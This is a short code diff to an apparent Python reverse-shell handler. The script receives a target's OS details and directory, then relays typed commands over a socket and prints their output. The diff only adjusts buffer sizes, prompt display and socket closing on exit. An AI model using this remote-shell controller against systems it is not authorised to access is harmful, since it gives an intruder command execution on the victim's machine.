@@ -82,20 +82,21 @@ def main(args):
     oss = c.recv(1024)
     print(oss.decode('ascii'))
     print()
+    directory = c.recv(2048)
+    print(directory.decode('ascii') + ">", end="")
     while True:
         try:
-            directory = c.recv(3072)
-            print("Remote Shell:")
-            sys.stdout.write(str(directory.decode('ascii')))
-            cmd = input(">")
+            cmd = input()
             if cmd == 'quit' or cmd == 'exit':
                 sys.exit()
+                c.close()
+                s.close()
                 break
             else:
                 try:
                     c.send(cmd.encode('ascii'))
-                    output = c.recv(1024)
-                    print(str(output.decode('utf-8')))
+                    output = c.recv(2048)
+                    sys.stdout.write(str(output.decode('utf-8')))
                 except:
                     continue
         except:
